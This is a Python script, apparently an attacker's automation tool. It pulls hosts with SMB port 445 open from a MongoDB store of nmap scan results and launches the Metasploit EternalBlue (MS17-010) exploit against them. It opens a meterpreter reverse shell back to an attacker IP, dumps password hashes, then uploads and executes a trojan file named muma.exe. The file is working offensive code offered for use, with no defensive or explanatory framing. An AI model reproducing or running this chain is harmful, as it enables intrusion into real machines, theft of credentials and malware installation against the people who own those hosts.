from pymetasploit3.msfrpc import MsfRpcClient
import os
import time
import pymongo


def readtargert():   #在数据库中寻找目标
    client = pymongo.MongoClient(host='localhost', port=27017)  # 连接数据库
    db = client.nmapy  # 指定数据库
    set = db.scanre  # 指定要操作的集合
    print('正在获取目标：')
    for ip in set.find():
        if (ip['port'] == '445') & (ip['state'] == 'open'):
            host = ip['host']
            print('获取到目标:' + host)
    return host


#def Connecting_msfrpc():    #连接msfrpc服务
    #os.system('msfrpcd -P password -S')


def exploit(host):      #攻击载荷构建
    print('正在连接MSGRPC服务')
    time.sleep(10)
    client = MsfRpcClient('password')
    print('连接MSGRPC服务成功')
    print('开始构建攻击载荷')
    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
    print('windows/smb/ms17_010_eternalblue')
    exploit['RHOSTS'] = str(host)
    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
    print('windows/x64/meterpreter/reverse_tcp')
    payload['LHOST'] = '192.168.186.129'
    print('设定攻击者ip地址：192.168.186.129')
    payload['LPORT'] = 4444
    print('设定受害者回连端口：4444')
    exploit.execute(payload=payload)
    client.sessions.list
    print(client.sessions.list)# 查看session列表
    number1 = input('选择session id:\n')
    shell = client.sessions.session(number1)
    print('攻击成功，读取目标hash')
    shell.write('hashdump')
    print('攻击载荷投递')
    shell.write('upload /root/Payloads/muma.exe c:\\')
    print('攻击载荷投递成功')
    time.sleep(10)
    shell.write('execute -f c:\\muma.exe)')
    print(shell.read())


def main():
    #Connecting_msfrpc()
    exploit(readtargert())


main()